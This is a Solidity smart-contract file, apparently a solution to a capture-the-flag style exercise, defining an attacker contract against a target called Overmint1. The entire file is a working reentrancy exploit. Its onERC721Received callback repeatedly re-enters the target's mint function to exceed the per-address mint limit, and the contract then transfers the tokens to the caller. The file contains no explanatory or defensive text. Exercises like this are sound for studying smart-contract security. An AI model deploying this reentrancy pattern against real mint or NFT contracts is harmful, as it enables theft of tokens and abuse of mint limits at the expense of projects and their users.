// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import {Overmint1} from "../Overmint1.sol";

contract Overmint1Attacker {
  Overmint1 private victimContract;

  constructor(address _overmint1) {
    victimContract = Overmint1(_overmint1);
  }

  function attack() external {
    victimContract.mint();

    for (uint8 i = 1; i <= 5; ) {
      victimContract.safeTransferFrom(address(this), msg.sender, i);
      unchecked {
        i++;
      }
    }
  }

  function onERC721Received(
    address operator,
    address from,
    uint256 tokenIds,
    bytes calldata data
  ) external returns (bytes4) {
    while (victimContract.balanceOf(address(this)) <= 5) {
       victimContract.mint();
    }

    return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
  }
}